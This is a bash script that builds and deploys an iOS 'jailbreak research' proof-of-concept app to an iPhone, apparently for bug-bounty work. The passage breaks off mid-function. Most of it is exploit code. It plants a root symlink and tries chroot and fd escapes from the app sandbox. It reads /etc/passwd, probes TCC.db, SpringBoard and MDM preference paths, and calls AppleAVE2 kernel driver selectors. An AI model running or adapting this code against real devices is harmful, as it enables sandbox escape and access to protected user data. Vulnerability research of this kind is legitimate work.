#!/bin/bash
# ============================================================
# ONE-COMMAND PoC DEPLOYMENT TO iPHONE 17 PRO
# ============================================================
#
# This script:
#   1. Creates an Xcode project with both PoCs (chroot + AVE2)
#   2. Builds for arm64 (device)
#   3. Signs with your development identity
#   4. Deploys to connected iPhone via ios-deploy
#
# Prerequisites:
#   - Xcode (with iOS SDK) installed
#   - iPhone connected via USB and trusted
#   - Apple Developer account configured in Xcode
#   - ios-deploy: brew install ios-deploy
#
# Usage:
#   cd ~/jb-research
#   chmod +x deploy_to_iphone.sh
#   ./deploy_to_iphone.sh
#
# If code signing fails, see "Manual Xcode deployment" at the end.
# ============================================================

set -euo pipefail

WORK="$HOME/jb-research/iphone-deploy"
rm -rf "$WORK"
mkdir -p "$WORK/JBPoC.app"

echo "========================================"
echo "  iOS 26.6.2 Jailbreak Research PoC"
echo "  Deploying to iPhone 17 Pro"
echo "========================================"
echo ""

# ---- Check prerequisites ----
echo "[1/6] Checking prerequisites..."

if ! command -v xcrun &>/dev/null; then
    echo "ERROR: Xcode command line tools not found."
    echo "  Install: xcode-select --install"
    exit 1
fi

SDK=$(xcrun --sdk iphoneos --show-sdk-path 2>/dev/null || true)
if [ -z "$SDK" ]; then
    echo "ERROR: iOS SDK not found. Install Xcode with iOS SDK."
    exit 1
fi
echo "  iOS SDK: $SDK"

CLANG=$(xcrun --sdk iphoneos -f clang 2>/dev/null)
echo "  Clang: $CLANG"

# Check for signing identity
IDENTITY=$(security find-identity -v -p codesigning | grep "Apple Development" | head -1 | awk -F'"' '{print $2}')
if [ -z "$IDENTITY" ]; then
    IDENTITY=$(security find-identity -v -p codesigning | grep "iPhone Developer" | head -1 | awk -F'"' '{print $2}')
fi
if [ -z "$IDENTITY" ]; then
    echo "WARNING: No signing identity found."
    echo "  Open Xcode → Preferences → Accounts → Add Apple ID"
    echo "  Then run this script again, or use manual Xcode deployment (see end of script)."
    IDENTITY="Apple Development"
fi
echo "  Signing identity: $IDENTITY"

HAS_IOS_DEPLOY=false
if command -v ios-deploy &>/dev/null; then
    HAS_IOS_DEPLOY=true
    echo "  ios-deploy: $(which ios-deploy)"
else
    echo "  ios-deploy: NOT FOUND (brew install ios-deploy)"
    echo "  Will create project for manual Xcode deployment instead."
fi

echo ""

# ---- Write source files ----
echo "[2/6] Writing source files..."

# Info.plist
cat > "$WORK/Info.plist" << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleDevelopmentRegion</key>
    <string>en</string>
    <key>CFBundleExecutable</key>
    <string>JBPoC</string>
    <key>CFBundleIdentifier</key>
    <string>com.research.jbpoc</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundleName</key>
    <string>JBPoC</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleVersion</key>
    <string>1</string>
    <key>LSRequiresIPhoneOS</key>
    <true/>
    <key>UILaunchStoryboardName</key>
    <string></string>
    <key>UIRequiredDeviceCapabilities</key>
    <array>
        <string>arm64</string>
    </array>
    <key>UISupportedInterfaceOrientations</key>
    <array>
        <string>UIInterfaceOrientationPortrait</string>
    </array>
    <key>MinimumOSVersion</key>
    <string>26.0</string>
</dict>
</plist>
PLIST

# Entitlements
cat > "$WORK/entitlements.plist" << 'ENT'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>get-task-allow</key>
    <true/>
</dict>
</plist>
ENT

# ---- Main unified source file ----
# Combines both PoCs into a single iOS app with on-screen log output
cat > "$WORK/main.m" << 'OBJC'
/*
 * JBPoC — Unified iOS Jailbreak Research PoC
 *
 * Runs CVE-2026-43689 (chroot) and CVE-2026-84607 (AppleAVE2) PoCs
 * on the device. Results display on screen and in Console.app.
 *
 * LEGAL: Apple Security Bounty research on owned device.
 *        DMCA §1201(f)(j) exemptions apply.
 */

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <AVFoundation/AVFoundation.h>
// IOSurface header unavailable in iOS SDK 27.2 — declare what we use.
// The framework .tbd is present so -framework IOSurface links fine.
typedef struct __IOSurface *IOSurfaceRef;
extern uint32_t IOSurfaceGetID(IOSurfaceRef surface);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef surface);
extern size_t IOSurfaceGetPlaneCount(IOSurfaceRef surface);
extern size_t IOSurfaceGetWidth(IOSurfaceRef surface);
extern size_t IOSurfaceGetHeight(IOSurfaceRef surface);
extern size_t IOSurfaceGetBytesPerRow(IOSurfaceRef surface);
extern void *IOSurfaceGetBaseAddress(IOSurfaceRef surface);
extern IOSurfaceRef IOSurfaceLookup(uint32_t csid);
extern kern_return_t IOSurfaceLock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);
extern kern_return_t IOSurfaceUnlock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);
#define kIOSurfaceLockReadOnly 0x00000001
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/param.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <dirent.h>
#include <dlfcn.h>
#include <sys/utsname.h>
#include <sys/sysctl.h>
#include <os/log.h>

// ============================================================
// Global log buffer — feeds both NSLog and the on-screen view
// ============================================================

static NSMutableString *g_logBuffer = nil;
static UITextView *g_logView = nil;
static dispatch_queue_t g_logQueue = nil;

static NSString *wallClock(void) {
    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
    fmt.dateFormat = @"HH:mm:ss";
    return [fmt stringFromDate:[NSDate date]];
}

static void pocLog(NSString *msg) {
    if (!g_logBuffer) g_logBuffer = [NSMutableString new];
    if (!g_logQueue) g_logQueue = dispatch_queue_create("poc.log", DISPATCH_QUEUE_SERIAL);

    NSString *stamped = [NSString stringWithFormat:@"[%@] %@", wallClock(), msg];
    NSLog(@"%@", stamped);

    dispatch_async(g_logQueue, ^{
        [g_logBuffer appendString:stamped];
        [g_logBuffer appendString:@"\n"];
        NSString *snapshot = [g_logBuffer copy];
        dispatch_async(dispatch_get_main_queue(), ^{
            if (g_logView) {
                g_logView.text = snapshot;
                if (snapshot.length > 0) {
                    NSRange end = NSMakeRange(snapshot.length - 1, 1);
                    [g_logView scrollRangeToVisible:end];
                }
            }
        });
    });
}

#define LOG(fmt, ...) pocLog([NSString stringWithFormat:@"[CVE] " fmt, ##__VA_ARGS__])
#define PASS(fmt, ...) pocLog([NSString stringWithFormat:@"[+] " fmt, ##__VA_ARGS__])
#define FAIL(fmt, ...) pocLog([NSString stringWithFormat:@"[-] " fmt, ##__VA_ARGS__])
#define INFO(fmt, ...) pocLog([NSString stringWithFormat:@"[*] " fmt, ##__VA_ARGS__])

// ============================================================
// Device info collection
// ============================================================

static void printDeviceInfo(void) {
    struct utsname uts;
    uname(&uts);

    pocLog(@"========================================");
    pocLog(@"  iOS Jailbreak Research PoC Suite");
    pocLog(@"========================================");
    pocLog([NSString stringWithFormat:@"Device:  %@", [[UIDevice currentDevice] model]]);
    pocLog([NSString stringWithFormat:@"Name:    %@", [[UIDevice currentDevice] name]]);
    pocLog([NSString stringWithFormat:@"iOS:     %@", [[UIDevice currentDevice] systemVersion]]);
    pocLog([NSString stringWithFormat:@"Kernel:  %s %s", uts.release, uts.machine]);
    pocLog([NSString stringWithFormat:@"UID:     %d  PID: %d", getuid(), getpid()]);

    // Hardware model
    char hwmodel[64] = {0};
    size_t len = sizeof(hwmodel);
    sysctlbyname("hw.model", hwmodel, &len, NULL, 0);
    pocLog([NSString stringWithFormat:@"HW:      %s", hwmodel]);

    // CPU type
    char machine[64] = {0};
    len = sizeof(machine);
    sysctlbyname("hw.machine", machine, &len, NULL, 0);
    pocLog([NSString stringWithFormat:@"Machine: %s", machine]);

    pocLog(@"========================================");
    pocLog(@"");
}

// ============================================================
// CVE-2026-43689 — chroot(2) Entitlement Bypass
// ============================================================

typedef struct {
    BOOL chroot_succeeded;
    int chroot_errno;
    BOOL is_sandboxed;
    uid_t uid;
    uid_t euid;
} Q1Result;

typedef struct {
    BOOL sandbox_confused;
    BOOL can_write_outside_container;
    BOOL can_read_forbidden;
    BOOL symlink_escape_works;
    BOOL fd_escape_works;
} Q2Result;

static Q1Result testQ1_ChrootCallable(NSString *fakeRootPath) {
    Q1Result result = {0};
    result.uid = getuid();
    result.euid = geteuid();

    LOG(@"=== Q1: Can a sandboxed app call chroot(2)? ===");
    INFO(@"UID: %d, EUID: %d, PID: %d", result.uid, result.euid, getpid());

    NSString *container = NSHomeDirectory();
    result.is_sandboxed = [container containsString:@"Containers"];
    INFO(@"Container: %@", container);
    INFO(@"Sandboxed: %@", result.is_sandboxed ? @"YES" : @"NO");

    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *dirs = @[@"etc", @"tmp", @"var", @"var/mobile", @"private", @"private/var"];
    for (NSString *dir in dirs) {
        NSString *path = [fakeRootPath stringByAppendingPathComponent:dir];
        [fm createDirectoryAtPath:path withIntermediateDirectories:YES attributes:nil error:nil];
    }

    NSString *marker = [fakeRootPath stringByAppendingPathComponent:@"etc/.chroot_marker"];
    [@"Q1-CONFIRMED" writeToFile:marker atomically:YES encoding:NSUTF8StringEncoding error:nil];

    INFO(@"Pre-chroot baseline:");
    struct stat st;
    BOOL canStat = (stat("/etc/passwd", &st) == 0);
    INFO(@"  stat(/etc/passwd) = %@", canStat ? @"accessible" : @"blocked");
    canStat = (stat("/var/mobile", &st) == 0);
    INFO(@"  stat(/var/mobile) = %@", canStat ? @"accessible" : @"blocked");

    if (chdir([fakeRootPath UTF8String]) != 0) {
        FAIL(@"chdir to fakeroot failed: %s", strerror(errno));
        result.chroot_errno = errno;
        return result;
    }

    int ret = chroot([fakeRootPath UTF8String]);
    result.chroot_errno = errno;
    result.chroot_succeeded = (ret == 0);

    if (ret == 0) {
        PASS(@"!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
        PASS(@"chroot(2) RETURNED 0 — SYSCALL SUCCEEDED");
        PASS(@"Q1 ANSWER: YES");
        PASS(@"!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");

        BOOL markerExists = (stat("/etc/.chroot_marker", &st) == 0);
        PASS(@"  Marker at /etc/.chroot_marker: %@", markerExists ? @"FOUND" : @"missing");

        BOOL realPasswd = (stat("/etc/passwd", &st) == 0);
        INFO(@"  /etc/passwd visible: %@", realPasswd ? @"YES (bad — not chrooted)" : @"NO (good — chrooted)");
    } else {
        FAIL(@"chroot(2) FAILED: errno=%d (%s)", result.chroot_errno, strerror(result.chroot_errno));
        switch (result.chroot_errno) {
            case EPERM:
                FAIL(@"Q1: NO — EPERM. Root-uid check still in place.");
                FAIL(@"  Bug may require root-but-unentitled context.");
                break;
            case EACCES:
                FAIL(@"Q1: NO — EACCES. Sandbox syscall filter blocks chroot.");
                break;
            default:
                FAIL(@"Q1: NO — errno %d", result.chroot_errno);
                break;
        }
    }

    return result;
}

static Q2Result testQ2_SandboxPathConfusion(NSString *fakeRootPath) {
    Q2Result result = {0};

    LOG(@"=== Q2: Post-chroot sandbox path confusion? ===");

    // 2a: Write to "system" path (maps to fakeroot on real FS)
    {
        int fd = open("/etc/sandbox_write_test", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (fd >= 0) {
            write(fd, "test", 4);
            close(fd);
            PASS(@"2a: Wrote to /etc/ (post-chroot, maps to fakeroot)");
            unlink("/etc/sandbox_write_test");
        } else {
            FAIL(@"2a: /etc/ write blocked: %s", strerror(errno));
        }
    }

    // 2b: Write to path resembling user prefs
    {
        mkdir("/var/mobile/Library", 0755);
        mkdir("/var/mobile/Library/Preferences", 0755);
        int fd = open("/var/mobile/Library/Preferences/test.plist", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (fd >= 0) {
            write(fd, "test", 4);
            close(fd);
            INFO(@"2b: Wrote /var/mobile/Library/Preferences/test.plist");
        } else {
            INFO(@"2b: Prefs write blocked: %s", strerror(errno));
        }
    }

    // 2c: Symlink escape (pre-planted before chroot)
    {
        struct stat st;
        if (stat("/escape/etc/passwd", &st) == 0) {
            PASS(@"2c: SYMLINK ESCAPE — /escape/etc/passwd ACCESSIBLE");
            result.symlink_escape_works = YES;

            int fd = open("/escape/tmp/chroot_escape_proof", O_CREAT | O_WRONLY | O_TRUNC, 0644);
            if (fd >= 0) {
                const char *proof = "CVE-2026-43689 sandbox escape confirmed\n";
                write(fd, proof, strlen(proof));
                close(fd);
                PASS(@"2c: WROTE TO REAL /tmp VIA SYMLINK ESCAPE");
                result.sandbox_confused = YES;
                result.can_write_outside_container = YES;
            } else {
                INFO(@"2c: Symlink readable, not writable: %s", strerror(errno));
            }

            fd = open("/escape/etc/passwd", O_RDONLY);
            if (fd >= 0) {
                char buf[128];
                ssize_t n = read(fd, buf, sizeof(buf) - 1);
                close(fd);
                if (n > 0) {
                    buf[n < 60 ? n : 60] = '\0';
                    PASS(@"2c: Read /etc/passwd: %.50s...", buf);
                    result.can_read_forbidden = YES;
                }
            }
        } else {
            INFO(@"2c: /escape/etc/passwd not reachable (%s)", strerror(errno));
        }
    }

    // 2d: Relative path escape
    {
        struct stat st;
        if (stat("/../../../etc/passwd", &st) == 0) {
            PASS(@"2d: RELATIVE PATH ESCAPE WORKS");
            result.sandbox_confused = YES;
        } else {
            INFO(@"2d: Relative escape blocked: %s", strerror(errno));
        }
    }

    if (!result.sandbox_confused) {
        INFO(@"Q2 ANSWER: No path confusion detected (may need different vectors)");
    } else {
        PASS(@"Q2 ANSWER: YES — sandbox IS confused post-chroot");
    }

    return result;
}

static void testQ3_PrivilegedAccess(Q2Result q2) {
    LOG(@"=== Q3: Privileged access via confusion? ===");

    if (!q2.sandbox_confused && !q2.symlink_escape_works) {
        INFO(@"Q3: Skipping — no confusion or escape in Q2");
        return;
    }

    if (q2.can_write_outside_container) {
        PASS(@"Probing privileged targets via escape...");

        struct { const char *path; const char *desc; } targets[] = {
            {"/escape/private/var/db/TCC/TCC.db", "TCC database"},
            {"/escape/private/var/mobile/Library/Preferences/com.apple.springboard.plist", "SpringBoard prefs"},
            {"/escape/private/var/containers/Shared/SystemGroup/", "System containers"},
            {"/escape/private/preboot/Cryptexes/", "Cryptex mount point"},
            {"/escape/usr/libexec/", "System daemons"},
            {"/escape/private/var/Managed Preferences/", "MDM prefs"},
            {NULL, NULL}
        };

        for (int i = 0; targets[i].path; i++) {
            struct stat st;
            if (stat(targets[i].path, &st) == 0) {
                int w = access(targets[i].path, W_OK);
                PASS(@"  %s %s: %s",
                     w == 0 ? "[RW]" : "[RO]",
                     targets[i].desc,
                     targets[i].path);
            } else {
                INFO(@"  [--] %s: unreachable", targets[i].desc);
            }
        }
    }
}

static void plantSymlinkEscape(NSString *fakeRootPath) {
    NSString *escapePath = [fakeRootPath stringByAppendingPathComponent:@"escape"];
    unlink([escapePath UTF8String]);
    rmdir([escapePath UTF8String]);

    if (symlink("/", [escapePath UTF8String]) == 0) {
        INFO(@"Planted symlink: %@ -> /", escapePath);
    } else {
        INFO(@"Symlink to / failed: %s, trying relative...", strerror(errno));
        symlink("../../../../../../../../", [escapePath UTF8String]);
    }
}

static void runChrootPoC(void) {
    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════╗");
    pocLog(@"║  CVE-2026-43689: chroot(2) Bypass    ║");
    pocLog(@"╚══════════════════════════════════════╝");
    pocLog(@"");

    NSString *container = NSHomeDirectory();
    NSString *fakeRoot = [container stringByAppendingPathComponent:@"Documents/fakeroot"];

    plantSymlinkEscape(fakeRoot);

    int saved_root_fd = open("/", O_RDONLY);
    INFO(@"Saved root fd: %d", saved_root_fd);

    Q1Result q1 = testQ1_ChrootCallable(fakeRoot);

    if (!q1.chroot_succeeded) {
        pocLog(@"");
        LOG(@"RESULT: chroot failed (errno=%d). Bug scope may be narrower.", q1.chroot_errno);
        if (saved_root_fd >= 0) close(saved_root_fd);
        return;
    }

    // Try fd-based chroot escape
    INFO(@"Attempting fd-based chroot escape...");
    if (saved_root_fd >= 0) {
        if (fchdir(saved_root_fd) == 0) {
            PASS(@"fchdir to saved root fd succeeded!");
            for (int i = 0; i < 20; i++) chdir("..");
            char cwd[PATH_MAX];
            if (getcwd(cwd, sizeof(cwd))) {
                INFO(@"CWD after escape: %s", cwd);
                if (strcmp(cwd, "/") == 0 || strlen(cwd) < 5) {
                    PASS(@"ESCAPED CHROOT VIA FD + CHDIR!");
                }
            }
        } else {
            INFO(@"fchdir escape failed: %s", strerror(errno));
        }
        close(saved_root_fd);
    }

    Q2Result q2 = testQ2_SandboxPathConfusion(fakeRoot);
    testQ3_PrivilegedAccess(q2);

    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════╗");
    pocLog(@"║  CVE-2026-43689 SUMMARY              ║");
    pocLog(@"╚══════════════════════════════════════╝");
    pocLog([NSString stringWithFormat:@"  Q1 chroot callable:  %@",
            q1.chroot_succeeded ? @"YES ★" : @"NO"]);
    pocLog([NSString stringWithFormat:@"  Q2 sandbox confused: %@",
            q2.sandbox_confused ? @"YES ★" : @"NO"]);
    pocLog([NSString stringWithFormat:@"     symlink escape:   %@",
            q2.symlink_escape_works ? @"YES" : @"NO"]);
    pocLog([NSString stringWithFormat:@"     fd escape:        %@",
            q2.fd_escape_works ? @"YES" : @"NO"]);
    pocLog([NSString stringWithFormat:@"     write outside:    %@",
            q2.can_write_outside_container ? @"YES ★" : @"NO"]);
    pocLog([NSString stringWithFormat:@"     read forbidden:   %@",
            q2.can_read_forbidden ? @"YES" : @"NO"]);
    pocLog(@"");
}

// ============================================================
// CVE-2026-84607 — AppleAVE2 Input Validation Bypass
// ============================================================

static void compressionOutputCallback(void *ref, void *src, OSStatus status,
                                       VTEncodeInfoFlags flags,
                                       CMSampleBufferRef buf) {
    if (status != noErr) {
        INFO(@"Encode callback: status=%d", (int)status);
    }
    if (buf) {
        PASS(@"Got encoded sample buffer from hardware encoder");
    }
}

static void testAVE2_VideoToolbox(void) {
    LOG(@"=== AVE2 Approach 1: VideoToolbox ===");

    VTCompressionSessionRef session = NULL;
    int width = 1920, height = 1080;

    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, width, height, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        compressionOutputCallback, NULL, &session);

    if (status != noErr) {
        INFO(@"HEVC session failed (%d), trying H.264...", (int)status);
        status = VTCompressionSessionCreate(
            kCFAllocatorDefault, width, height, kCMVideoCodecType_H264,
            (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
            compressionOutputCallback, NULL, &session);
        if (status != noErr) {
            FAIL(@"H.264 also failed: %d", (int)status);
            return;
        }
        PASS(@"H.264 compression session created (AppleAVE2)");
    } else {
        PASS(@"HEVC compression session created (AppleAVE2)");
    }

    // Set properties that map to kernel-side parameters
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval,
                         (__bridge CFTypeRef)@(300));
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering,
                         kCFBooleanTrue);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel,
                         kVTProfileLevel_HEVC_Main10_AutoLevel);

    status = VTCompressionSessionPrepareToEncodeFrames(session);
    INFO(@"PrepareToEncode: %d", (int)status);

    CVPixelBufferRef pb = NULL;
    status = CVPixelBufferCreate(kCFAllocatorDefault, width, height,
        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
        (__bridge CFDictionaryRef)@{
            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
        }, &pb);

    if (status != noErr || !pb) {
        FAIL(@"Pixel buffer creation failed: %d", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    CVPixelBufferLockBaseAddress(pb, 0);
    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
    if (y) memset(y, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * CVPixelBufferGetHeightOfPlane(pb, 0));
    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
    if (uv) memset(uv, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * CVPixelBufferGetHeightOfPlane(pb, 1));
    CVPixelBufferUnlockBaseAddress(pb, 0);

    INFO(@"Encoding frame (sends params to AppleAVE2 kernel driver)...");

    status = VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    INFO(@"EncodeFrame: %d", (int)status);

    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    INFO(@"CompleteFrames: %d", (int)status);

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}

static void testAVE2_IOKit(void) {
    LOG(@"=== AVE2 Approach 2: Direct IOKit ===");

    io_service_t svc = IOServiceGetMatchingService(
        kIOMainPortDefault, IOServiceMatching("AppleAVE2Driver"));

    if (svc == IO_OBJECT_NULL) {
        svc = IOServiceGetMatchingService(
            kIOMainPortDefault, IOServiceMatching("AppleAVE2"));
    }

    if (svc == IO_OBJECT_NULL) {
        INFO(@"AppleAVE2 service not found. Enumerating video services...");
        io_iterator_t iter;
        if (IOServiceGetMatchingServices(kIOMainPortDefault,
                IOServiceMatching("IOService"), &iter) == KERN_SUCCESS) {
            io_service_t s;
            int found = 0;
            while ((s = IOIteratorNext(iter)) != IO_OBJECT_NULL) {
                io_name_t name;
                IORegistryEntryGetName(s, name);
                if (strstr(name, "AVE") || strstr(name, "Video") || strstr(name, "Encoder")) {
                    INFO(@"  Service: %s", name);
                    found++;
                }
                IOObjectRelease(s);
            }
            IOObjectRelease(iter);
            INFO(@"Found %d video services", found);
        }
        return;
    }

    PASS(@"Found AppleAVE2 service: 0x%x", svc);

    io_connect_t conn = IO_OBJECT_NULL;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);

    if (kr != KERN_SUCCESS) {
        FAIL(@"IOServiceOpen failed: 0x%x (%s)", kr, mach_error_string(kr));
        INFO(@"Sandbox may block direct IOKit. Use VideoToolbox path instead.");
        return;
    }

    PASS(@"Opened AppleAVE2UserClient: 0x%x", conn);

    INFO(@"Probing external method selectors...");
    for (uint32_t sel = 0; sel < 16; sel++) {
        uint64_t out[1] = {0};
        uint32_t outCnt = 1;
        kr = IOConnectCallScalarMethod(conn, sel, NULL, 0, out, &outCnt);
        const char *desc = kr == KERN_SUCCESS ? "OK" :
                           kr == 0xe00002c2 ? "BadArgument" :
                           kr == 0xe00002c7 ? "Unsupported" :
                           kr == 0xe00002cd ? "NotPrivileged" : "Error";
        INFO(@"  Selector %2u: %s (0x%x)", sel, desc, kr);
    }

    IOServiceClose(conn);
}

// ============================================================
// AVE2 Property Dictionary Dump
// Enumerates all settable VTCompressionSession properties
// to classify which of the 97 unchecked params are reachable.
// ZERO RISK — read-only query, no encoding.
// ============================================================

static void dumpPropertyValue(NSString *key, CFTypeRef value, int indent) {
    NSString *pad = [@"" stringByPaddingToLength:indent*2 withString:@" " startingAtIndex:0];
    if (!value) {
        INFO(@"%@%@: (null)", pad, key);
        return;
    }
    CFTypeID tid = CFGetTypeID(value);
    if (tid == CFStringGetTypeID()) {
        INFO(@"%@%@: \"%@\"", pad, key, (__bridge NSString *)value);
    } else if (tid == CFNumberGetTypeID()) {
        double d;
        CFNumberGetValue(value, kCFNumberFloat64Type, &d);
        if (d == (long long)d) {
            INFO(@"%@%@: %lld", pad, key, (long long)d);
        } else {
            INFO(@"%@%@: %g", pad, key, d);
        }
    } else if (tid == CFBooleanGetTypeID()) {
        INFO(@"%@%@: %s", pad, key, CFBooleanGetValue(value) ? "YES" : "NO");
    } else if (tid == CFDictionaryGetTypeID()) {
        NSDictionary *dict = (__bridge NSDictionary *)value;
        INFO(@"%@%@: {", pad, key);
        for (NSString *k in dict) {
            dumpPropertyValue(k, (__bridge CFTypeRef)dict[k], indent + 1);
        }
        INFO(@"%@}", pad);
    } else if (tid == CFArrayGetTypeID()) {
        NSArray *arr = (__bridge NSArray *)value;
        INFO(@"%@%@: [%lu items]", pad, key, (unsigned long)arr.count);
        int i = 0;
        for (id item in arr) {
            if (i >= 10) { INFO(@"%@  ... (%lu more)", pad, (unsigned long)(arr.count - 10)); break; }
            dumpPropertyValue([NSString stringWithFormat:@"[%d]", i], (__bridge CFTypeRef)item, indent + 1);
            i++;
        }
    } else {
        INFO(@"%@%@: <%@>", pad, key, [(__bridge id)value description]);
    }
}

static void runPropertyDump(void) {
    pocLog(@"");
    pocLog(@"╔══════════════════════════════════════╗");
    pocLog(@"║  AVE2 Property Dictionary Dump        ║");
    pocLog(@"╚══════════════════════════════════════╝");
    pocLog(@"");

    INFO(@"Dumping all settable HEVC encoder properties...");
    INFO(@"This classifies which params the app can control.");
    pocLog(@"");

    // Create HEVC session (same as PoC)
    VTCompressionSessionRef session = NULL;
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1920, 1080, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        compressionOutputCallback, NULL, &session);

    if (status != noErr) {
        FAIL(@"Cannot create HEVC session: %d", (int)status);
        return;
    }
    PASS(@"HEVC session created for property enumeration");

    // 1. Dump supported properties dictionary
    LOG(@"=== Supported Properties ===");
    CFDictionaryRef propDict = NULL;
    status = VTSessionCopySupportedPropertyDictionary(session, &propDict);
    if (status != noErr || !propDict) {
        FAIL(@"VTSessionCopySupportedPropertyDictionary failed: %d", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    NSDictionary *props = (__bridge NSDictionary *)propDict;
    INFO(@"Total settable properties: %lu", (unsigned long)props.count);
    pocLog(@"");

    // Sort keys for consistent output
    NSArray *sortedKeys = [[props allKeys] sortedArrayUsingSelector:@selector(compare:)];

    int classA = 0, classMaybe = 0;
    for (NSString *key in sortedKeys) {
        NSDictionary *info = props[key];
        NSString *type = info[@"PropertyType"] ?: @"unknown";
        NSNumber *readWriteStatus = info[@"ReadWriteStatus"];
        NSString *rwStr = @"?";
        if ([readWriteStatus isKindOfClass:[NSNumber class]]) {
            int rw = readWriteStatus.intValue;
            rwStr = (rw == 1) ? @"ReadOnly" : (rw == 3) ? @"ReadWrite" : [NSString stringWithFormat:@"0x%x", rw];
        } else if ([readWriteStatus isKindOfClass:[NSString class]]) {
            rwStr = (NSString *)readWriteStatus;
        }

        NSString *docStr = info[@"Documentation"] ?: @"";
        NSNumber *minVal = info[@"MinimumValue"];
        NSNumber *maxVal = info[@"MaximumValue"];

        INFO(@"PROP: %@", key);
        INFO(@"  Type: %@  RW: %@", type, rwStr);
        if (minVal || maxVal) {
            INFO(@"  Range: [%@ .. %@]", minVal ?: @"?", maxVal ?: @"?");
        }
        if (docStr.length > 0 && docStr.length < 200) {
            INFO(@"  Doc: %@", docStr);
        }

        // Check for sub-properties
        NSDictionary *subProps = info[@"SupportedValueList"];
        if (subProps) {
            NSArray *vals = (NSArray *)subProps;
            if ([vals isKindOfClass:[NSArray class]] && vals.count <= 20) {
                NSMutableString *valStr = [NSMutableString string];
                for (id v in vals) {
                    if (valStr.length > 0) [valStr appendString:@", "];
                    [valStr appendFormat:@"%@", v];
                }
                INFO(@"  Values: [%@]", valStr);
            }
        }

        // Classify
        NSString *lk = [key lowercaseString];
        if ([lk containsString:@"temporal"] || [lk containsString:@"bframe"] ||
            [lk containsString:@"gop"] || [lk containsString:@"slice"] ||
            [lk containsString:@"tile"] || [lk containsString:@"reference"] ||
            [lk containsString:@"reorder"] || [lk containsString:@"layer"] ||
            [lk containsString:@"max"] || [lk containsString:@"num"]) {
            classA++;
            INFO(@"  ** CLASSIFICATION: Likely Class A (session config, CVE-relevant) **");
        }

        pocLog(@"");
    }

    INFO(@"=== SUMMARY ===");
    INFO(@"Total properties: %lu", (unsigned long)props.count);
    INFO(@"CVE-relevant (Class A candidates): %d", classA);
    pocLog(@"");

    // 2. Also query current values of key properties we know about
    LOG(@"=== Current Values of Key Properties ===");

    NSArray *keyProps = @[
        @"MaxKeyFrameInterval",
        @"MaxKeyFrameIntervalDuration",
        @"AllowFrameReordering",
        @"MaxFrameDelayCount",
        @"ProfileLevel",
        @"H264EntropyMode",
        @"RealTime",
        @"MaxH264SliceBytes",
        @"MaximizePowerEfficiency",
        @"AllowTemporalCompression",
        @"AllowOpenGOP",
        @"AverageBitRate",
        @"MoreFramesBeforeStart",
        @"MoreFramesAfterEnd",
        @"Quality",
    ];

    for (NSString *shortKey in keyProps) {
        NSString *fullKey = [NSString stringWithFormat:@"com.apple.videotoolbox.videoencoder.%@", shortKey];
        CFTypeRef val = NULL;
        status = VTSessionCopyProperty(session, (__bridge CFStringRef)fullKey, kCFAllocatorDefault, &val);
        if (status == noErr && val) {
